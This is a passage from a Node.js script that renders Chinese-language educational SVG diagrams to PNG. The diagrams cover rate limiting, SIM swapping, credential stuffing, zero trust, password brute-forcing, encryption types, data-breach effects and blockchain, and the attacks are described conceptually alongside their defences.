<text x="70" y="40" font-size="18" fill="#333" font-weight="bold">API 限流：令牌桶算法</text>
<rect x="280" y="80" width="160" height="100" rx="4" fill="none" stroke="#A56F4A" stroke-width="2" />
<text x="310" y="110" font-size="14" fill="#A56F4A" font-weight="bold">令牌桶</text>
<text x="300" y="140" font-size="12" fill="#333">容量：100个令牌</text>
<text x="300" y="160" font-size="12" fill="#333">填充：10个/秒</text>
<rect x="520" y="80" width="120" height="50" rx="4" fill="none" stroke="#6B8E23" stroke-width="2" />
<text x="540" y="110" font-size="13" fill="#6B8E23">API Server</text>
<rect x="80" y="80" width="120" height="50" rx="4" fill="none" stroke="#4A6FA5" stroke-width="2" />
<text x="95" y="110" font-size="13" fill="#333">Client</text>
<line x1="200" y1="105" x2="280" y2="105" stroke="#666" stroke-width="1" marker-end="url(#arrow)" />
<text x="210" y="95" font-size="11" fill="#333">请求</text>
<line x1="440" y1="105" x2="520" y2="105" stroke="#6B8E23" stroke-width="1" marker-end="url(#arrow)" />
<text x="450" y="95" font-size="11" fill="#333">取令牌</text>
<rect x="280" y="220" width="160" height="50" rx="4" fill="none" stroke="#D88A8A" stroke-width="2" />
<text x="300" y="250" font-size="12" fill="#D88A8A">桶空 → 429 Too Many</text>
<line x1="360" y1="180" x2="360" y2="220" stroke="#D88A8A" stroke-width="1" stroke-dasharray="3,3" marker-end="url(#arrow)" />
<text x="80" y="280" font-size="12" fill="#333">令牌桶特点：</text>
<text x="80" y="305" font-size="12" fill="#333">1. 允许突发——桶满时可以瞬间消费所有令牌</text>
<text x="80" y="330" font-size="12" fill="#333">2. 长期限速——平均速率由填充速度决定</text>
<text x="80" y="355" font-size="12" fill="#333">3. 实现方式：Redis + Lua脚本保证原子性</text>
<text x="80" y="390" font-size="12" fill="#6B8E23">其他限流算法：漏桶（严格匀速）/ 滑动窗口 / 计数器</text>
<text x="80" y="420" font-size="12" fill="#666">限流不只是防攻击——是保护系统不被突发流量压垮的最后一道防线</text>
${marker}
</svg>`,

  'q59-sim-swap': `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 500" font-family="monospace" font-size="14">${baseStyle}
<text x="70" y="40" font-size="18" fill="#333" font-weight="bold">SIM 卡交换攻击</text>
<rect x="80" y="80" width="120" height="50" rx="4" fill="none" stroke="#4A6FA5" stroke-width="2" />
<text x="95" y="110" font-size="13" fill="#333">受害者</text>
<rect x="280" y="80" width="130" height="50" rx="4" fill="none" stroke="#A56F4A" stroke-width="2" />
<text x="300" y="110" font-size="13" fill="#A56F4A">运营商</text>
<rect x="280" y="160" width="130" height="50" rx="4" fill="none" stroke="#D88A8A" stroke-width="2" />
<text x="300" y="190" font-size="12" fill="#D88A8A">补办SIM卡</text>
<text x="300" y="205" font-size="11" fill="#333">（伪造身份证）</text>
<rect x="500" y="160" width="130" height="50" rx="4" fill="none" stroke="#D88A8A" stroke-width="2" />
<text x="510" y="190" font-size="12" fill="#D88A8A">旧SIM失效</text>
<text x="510" y="205" font-size="11" fill="#333">短信到新卡</text>
<rect x="500" y="240" width="130" height="50" rx="4" fill="none" stroke="#D88A8A" stroke-width="2" />
<text x="510" y="270" font-size="12" fill="#D88A8A">接收验证码</text>
<rect x="280" y="320" width="340" height="50" rx="4" fill="none" stroke="#D88A8A" stroke-width="2" />
<text x="300" y="350" font-size="13" fill="#D88A8A" font-weight="bold">重置密码 → 劫持账号 → 转账</text>
<line x1="200" y1="105" x2="280" y2="105" stroke="#666" stroke-width="1" marker-end="url(#arrow)" />
<text x="210" y="95" font-size="11" fill="#333">1.信息收集</text>
<line x1="345" y1="130" x2="345" y2="160" stroke="#D88A8A" stroke-width="1" marker-end="url(#arrow)" />
<line x1="410" y1="185" x2="500" y2="185" stroke="#D88A8A" stroke-width="1" marker-end="url(#arrow)" />
<line x1="565" y1="210" x2="565" y2="240" stroke="#D88A8A" stroke-width="1" marker-end="url(#arrow)" />
<line x1="500" y1="265" x2="450" y2="320" stroke="#D88A8A" stroke-width="1" marker-end="url(#arrow)" />
<text x="80" y="410" font-size="12" fill="#6B8E23">防御：SMS验证码不作为唯一因子 → 双因素认证(TFA) → 硬件密钥/FIDO</text>
<text x="80" y="435" font-size="12" fill="#666">SIM Swap的根本问题：手机号被当成了"你是谁"的证明，但手机号是可以被转移的</text>
${marker}
</svg>`,

  'q60-credential-stuffing': `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 500" font-family="monospace" font-size="14">${baseStyle}
<text x="70" y="40" font-size="18" fill="#333" font-weight="bold">撞库攻击</text>
<rect x="80" y="80" width="150" height="80" rx="4" fill="none" stroke="#D88A8A" stroke-width="2" />
<text x="100" y="110" font-size="13" fill="#D88A8A" font-weight="bold">网站A被黑</text>
<text x="95" y="135" font-size="12" fill="#333">泄露100万账号密码</text>
<text x="95" y="155" font-size="12" fill="#333">（明文或弱哈希）</text>
<rect x="320" y="80" width="150" height="80" rx="4" fill="none" stroke="#A56F4A" stroke-width="2" />
<text x="340" y="110" font-size="13" fill="#A56F4A" font-weight="bold">攻击者</text>
<text x="335" y="135" font-size="12" fill="#333">用A的账号密码</text>
<text x="335" y="155" font-size="12" fill="#333">去登录网站B/C/D...</text>
<rect x="570" y="80" width="150" height="80" rx="4" fill="none" stroke="#D88A8A" stroke-width="2" />
<text x="590" y="110" font-size="13" fill="#D88A8A" font-weight="bold">网站B</text>
<text x="585" y="135" font-size="12" fill="#D88A8A">约5-15%成功</text>
<text x="585" y="155" font-size="12" fill="#D88A8A">（用户复用密码）</text>
<line x1="230" y1="120" x2="320" y2="120" stroke="#666" stroke-width="1" marker-end="url(#arrow)" />
<line x1="470" y1="120" x2="570" y2="120" stroke="#666" stroke-width="1" marker-end="url(#arrow)" />
<text x="80" y="200" font-size="13" fill="#333" font-weight="bold">为什么有效？</text>
<text x="80" y="225" font-size="12" fill="#333">人类密码习惯：一个密码走天下——60%+用户在多个网站用相同密码</text>
<text x="80" y="250" font-size="12" fill="#333">攻击者不需要"破解"——只需要"试"已有账号密码组合</text>
<text x="80" y="285" font-size="13" fill="#6B8E23" font-weight="bold">防御：</text>
<text x="80" y="310" font-size="12" fill="#6B8E23">1. 强制密码复杂度 + 定期检查是否在泄露库中（haveibeenpwned）</text>
<text x="80" y="335" font-size="12" fill="#6B8E23">2. 异常登录检测（新设备/新IP/异地） → 二次验证</text>
<text x="80" y="360" font-size="12" fill="#6B8E23">3. 限制登录尝试频率 + 验证码</text>
<text x="80" y="385" font-size="12" fill="#6B8E23">4. 推广双因素认证（TFA）</text>
<text x="80" y="420" font-size="12" fill="#666">本质：撞库不是技术漏洞——是用户行为漏洞。每个密码"只在一个地方用"才能根治</text>
${marker}
</svg>`,

  'q61-zero-trust': `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 500" font-family="monospace" font-size="14">${baseStyle}
<text x="70" y="40" font-size="18" fill="#333" font-weight="bold">零信任架构：永不信任，持续验证</text>
<rect x="80" y="80" width="640" height="100" rx="4" fill="none" stroke="#D88A8A" stroke-width="2" />
<text x="100" y="110" font-size="13" fill="#D88A8A" font-weight="bold">传统架构（城堡模型）：</text>
<text x="100" y="135" font-size="12" fill="#333">内网 = 可信 → 外网 = 不可信</text>
<text x="100" y="160" font-size="12" fill="#D88A8A">问题：一旦突破外网防线（钓鱼/VPN漏洞），内网畅通无阻</text>
<rect x="80" y="210" width="640" height="150" rx="4" fill="none" stroke="#6B8E23" stroke-width="2" />
<text x="100" y="240" font-size="13" fill="#6B8E23" font-weight="bold">零信任架构：</text>
<text x="100" y="265" font-size="12" fill="#333">1. 身份验证：每个请求都验证身份（不只是首次登录）</text>
<text x="100" y="290" font-size="12" fill="#333">2. 最小权限：只授予完成任务所需的最小权限</text>
<text x="100" y="315" font-size="12" fill="#333">3. 设备健康：验证设备是否合规（补丁/加密/安全状态）</text>
<text x="100" y="340" font-size="12" fill="#333">4. 持续评估：基于上下文（位置/时间/行为）动态调整信任</text>
<rect x="280" y="200" width="160" height="0" />
<text x="100" y="385" font-size="12" fill="#333">核心转变：从"在哪里"（内外网）→ "是谁、用什么设备、干什么"</text>
<text x="100" y="410" font-size="12" fill="#666">Google BeyondCorp 是零信任的标杆实践——员工从任何地点访问任何应用都需要身份+设备验证</text>
${marker}
</svg>`,

  'q62-brute-force': `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 500" font-family="monospace" font-size="14">${baseStyle}
<text x="70" y="40" font-size="18" fill="#333" font-weight="bold">暴力破解：密码空间与破解时间</text>
<rect x="80" y="80" width="640" height="60" rx="4" fill="none" stroke="#4A6FA5" stroke-width="2" />
<text x="100" y="105" font-size="13" fill="#4A6FA5" font-weight="bold">密码长度 vs 破解时间（假设每秒试10亿次）</text>
<text x="100" y="130" font-size="12" fill="#333">6位纯数字(10^6)：0.001秒  |  6位字母数字(62^6)：3分钟</text>
<rect x="80" y="160" width="640" height="80" rx="4" fill="none" stroke="#A56F4A" stroke-width="2" />
<text x="100" y="185" font-size="12" fill="#A56F4A">8位纯数字(10^8)：0.1秒  |  8位字母数字(62^8)：5.7小时</text>
<text x="100" y="210" font-size="12" fill="#A56F4A">10位字母数字(62^10)：1.4年  |  12位字母数字(62^12)：5,300年</text>
<text x="100" y="230" font-size="12" fill="#A56F4A">16位字母数字(62^16)：7.5 × 10^15 年（宇宙年龄的5万倍）</text>
<rect x="80" y="260" width="640" height="60" rx="4" fill="none" stroke="#6B8E23" stroke-width="2" />
<text x="100" y="285" font-size="12" fill="#6B8E23">但！攻击者不随机试——先用字典（常用密码）+ 泄露库 + 规则变换</text>
<text x="100" y="310" font-size="12" fill="#6B8E23">"P@ssw0rd123!"看似复杂实则在字典中 → 秒破</text>
<rect x="80" y="340" width="640" height="60" rx="4" fill="none" stroke="#D88A8A" stroke-width="2" />
<text x="100" y="365" font-size="12" fill="#D88A8A">正确做法：长 > 复杂。correct-horse-battery-staple比Tr0ub4dor#3更安全</text>
<text x="100" y="390" font-size="12" fill="#D88A8A">密码管理器 + 每站不同密码 → 字典攻击失效</text>
<text x="80" y="430" font-size="12" fill="#666">本质：密码安全 = 熵（不确定度）。长度比复杂度更能增加熵</text>
${marker}
</svg>`,

  'q63-symmetric-asymmetric': `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 500" font-family="monospace" font-size="14">${baseStyle}
<text x="70" y="40" font-size="18" fill="#333" font-weight="bold">对称加密 vs 非对称加密 + HTTPS混合加密</text>
<rect x="80" y="80" width="280" height="160" rx="4" fill="none" stroke="#4A6FA5" stroke-width="2" />
<text x="120" y="110" font-size="14" fill="#4A6FA5" font-weight="bold">对称加密</text>
<text x="100" y="140" font-size="12" fill="#333">同一把密钥加解密</text>
<text x="100" y="165" font-size="12" fill="#333">AES / ChaCha20</text>
<text x="100" y="195" font-size="12" fill="#4A6FA5">优点：速度快（GB/s）</text>
<text x="100" y="220" font-size="12" fill="#4A6FA5">缺点：密钥怎么传？</text>
<rect x="440" y="80" width="280" height="160" rx="4" fill="none" stroke="#6B8E23" stroke-width="2" />
<text x="480" y="110" font-size="14" fill="#6B8E23" font-weight="bold">非对称加密</text>
<text x="460" y="140" font-size="12" fill="#333">公钥加密，私钥解密</text>
<text x="460" y="165" font-size="12" fill="#333">RSA / ECC</text>
<text x="460" y="195" font-size="12" fill="#6B8E23">优点：解决密钥传输</text>
<text x="460" y="220" font-size="12" fill="#6B8E23">缺点：慢（MB/s）</text>
<rect x="80" y="280" width="640" height="100" rx="4" fill="none" stroke="#A56F4A" stroke-width="2" />
<text x="100" y="305" font-size="13" fill="#A56F4A" font-weight="bold">HTTPS 混合加密 = 取两者之长</text>
<text x="100" y="330" font-size="12" fill="#333">1. 非对称加密交换"会话密钥"（慢但只需一次，安全传递）</text>
<text x="100" y="355" font-size="12" fill="#333">2. 对称加密用"会话密钥"加密后续所有数据（快，大量数据）</text>
<text x="100" y="375" font-size="12" fill="#333">→ 兼顾安全性和性能</text>
<text x="80" y="420" font-size="12" fill="#666">本质：非对称解决"信任和密钥协商"，对称解决"高效数据加密"</text>
${marker}
</svg>`,

  'q64-data-breach': `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 500" font-family="monospace" font-size="14">${baseStyle}
<text x="70" y="40" font-size="18" fill="#333" font-weight="bold">数据泄露：连锁反应</text>
<rect x="80" y="80" width="120" height="50" rx="4" fill="none" stroke="#D88A8A" stroke-width="2" />
<text x="100" y="110" font-size="13" fill="#D88A8A">泄露事件</text>
<rect x="280" y="80" width="130" height="50" rx="4" fill="none" stroke="#A56F4A" stroke-width="2" />
<text x="300" y="105" font-size="12" fill="#A56F4A">撞库攻击</text>
<text x="300" y="120" font-size="11" fill="#333">用泄露密码试其他站</text>
<rect x="280" y="160" width="130" height="50" rx="4" fill="none" stroke="#A56F4A" stroke-width="2" />
<text x="300" y="185" font-size="12" fill="#A56F4A">钓鱼精准化</text>
<text x="300" y="200" font-size="11" fill="#333">知道真实姓名/手机</text>
<rect x="280" y="240" width="130" height="50" rx="4" fill="none" stroke="#A56F4A" stroke-width="2" />
<text x="300" y="265" font-size="12" fill="#A56F4A">社工攻击</text>
<text x="300" y="280" font-size="11" fill="#333">知道安全问题答案</text>
<rect x="280" y="320" width="130" height="50" rx="4" fill="none" stroke="#A56F4A" stroke-width="2" />
<text x="300" y="345" font-size="12" fill="#A56F4A">身份盗用</text>
<text x="300" y="360" font-size="11" fill="#333">身份证号被冒用</text>
<line x1="200" y1="105" x2="280" y2="105" stroke="#666" stroke-width="1" marker-end="url(#arrow)" />
<line x1="200" y1="110" x2="280" y2="185" stroke="#666" stroke-width="1" marker-end="url(#arrow)" />
<line x1="200" y1="115" x2="280" y2="265" stroke="#666" stroke-width="1" marker-end="url(#arrow)" />
<line x1="200" y1="120" x2="280" y2="345" stroke="#666" stroke-width="1" marker-end="url(#arrow)" />
<rect x="500" y="80" width="180" height="290" rx="4" fill="none" stroke="#D88A8A" stroke-width="2" />
<text x="520" y="110" font-size="13" fill="#D88A8A" font-weight="bold">持续影响</text>
<text x="520" y="140" font-size="12" fill="#333">第1年：直接损失</text>
<text x="520" y="160" font-size="12" fill="#333">第2年：撞库蔓延</text>
<text x="520" y="180" font-size="12" fill="#333">第3年：社工利用</text>
<text x="520" y="200" font-size="12" fill="#333">第N年：暗网流通</text>
<text x="520" y="240" font-size="12" fill="#D88A8A">数据无法"撤回"</text>
<text x="520" y="260" font-size="12" fill="#D88A8A">一旦泄露=永久泄露</text>
<text x="520" y="300" font-size="12" fill="#6B8E23">防御：</text>
<text x="520" y="325" font-size="11" fill="#6B8E23">字段级加密</text>
<text x="520" y="345" font-size="11" fill="#6B8E23">数据脱敏</text>
<text x="520" y="365" font-size="11" fill="#6B8E23">最小化采集</text>
<text x="80" y="420" font-size="12" fill="#666">GDPR规定72小时内上报——因为泄露的"涟漪效应"会随时间扩大而非缩小</text>
${marker}
</svg>`,

  'q65-blockchain': `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 500" font-family="monospace" font-size="14">${baseStyle}
<text x="70" y="40" font-size="18" fill="#333" font-weight="bold">区块链：去中心化记账</text>
<rect x="80" y="80" width="180" height="120" rx="4" fill="none" stroke="#4A6FA5" stroke-width="2" />
<text x="120" y="110" font-size="13" fill="#4A6FA5" font-weight="bold">Block N-1</text>
<text x="95" y="135" font-size="11" fill="#333">prev_hash: a3f5...</text>
<text x="95" y="155" font-size="11" fill="#333">data: tx1,tx2,tx3</text>
<text x="95" y="175" font-size="11" fill="#333">nonce: 82734</text>
<text x="95" y="195" font-size="11" fill="#333">hash: 7c9e1...</text>
<rect x="310" y="80" width="180" height="120" rx="4" fill="none" stroke="#6B8E23" stroke-width="2" />
<text x="350" y="110" font-size="13" fill="#6B8E23" font-weight="bold">Block N</text>
<text x="325" y="135" font-size="11" fill="#333">prev_hash: 7c9e1...</text>
<text x="325" y="155" font-size="11" fill="#333">data: tx4,tx5,tx6</text>
<text x="325" y="175" font-size="11" fill="#333">nonce: 45921</text>
<text x="325" y="195" font-size="11" fill="#333">hash: 2b8f4...</text>
<rect x="540" y="80" width="180" height="120" rx="4" fill="none" stroke="#A56F4A" stroke-width="2" />
<text x="580" y="110" font-size="13" fill="#A56F4A" font-weight="bold">Block N+1</text>
<text x="555" y="135" font-size="11" fill="#333">prev_hash: 2b8f4...</text>
<text x="555" y="155" font-size="11" fill="#333">data: tx7,tx8,tx9</text>
<text x="555" y="175" font-size="11" fill="#333">nonce: 19387</text>
<text x="555" y="195" font-size="11" fill="#333">hash: d5a2c...</text>
<line x1="260" y1="140" x2="310" y2="140" stroke="#666" stroke-width="1.5" marker-end="url(#arrow)" />
<line x1="490" y1="140" x2="540" y2="140" stroke="#666" stroke-width="1.5" marker-end="url(#arrow)" />
<rect x="80" y="240" width="640" height="70" rx="4" fill="none" stroke="#333" stroke-width="1.5" />
<text x="100" y="265" font-size="12" fill="#333" font-weight="bold">篡改Block N的数据 → hash变化 → Block N+1的prev_hash不匹配 → 链断裂</text>
<text x="100" y="290" font-size="12" fill="#333">要篡改必须重新计算后续所有块的nonce（工作量证明PoW）→ 需要超过51%算力</text>
<rect x="80" y="330" width="300" height="50" rx="4" fill="none" stroke="#6B8E23" stroke-width="1.5" />
<text x="100" y="350" font-size="12" fill="#6B8E23" font-weight="bold">优势</text>
<text x="100" y="370" font-size="11" fill="#6B8E23">无需中心机构、不可篡改、可追溯</text>
<rect x="420" y="330" width="300" height="50" rx="4" fill="none" stroke="#D88A8A" stroke-width="1.5" />
<text x="440" y="350" font-size="12" fill="#D88A8A" font-weight="bold">代价</text>
<text x="440" y="370" font-size="11" fill="#D88A8A">性能低(TPS低)、存储冗余、能源消耗</text>
<text x="80" y="420" font-size="12" fill="#666">区块链不是"更好的数据库"——是用"冗余+共识"换取"去信任"的系统</text>
${marker}
</svg>`
};

async function main() {
  for (const [name, svg] of Object.entries(svgs)) {
    const svgPath = path.join(outDir, `${name}.svg`);
    fs.writeFileSync(svgPath, svg);
    const pngPath = path.join(outDir, `${name}.png`);
    await sharp(Buffer.from(svg))
      .resize(1600, 1000, { fit: 'contain' })
      .png({ quality: 100, compressionLevel: 6 })
      .toFile(pngPath);
    console.log(`Generated: ${name}.png`);
  }
}

main().catch(e => { console.error(e); process.exit(1); });
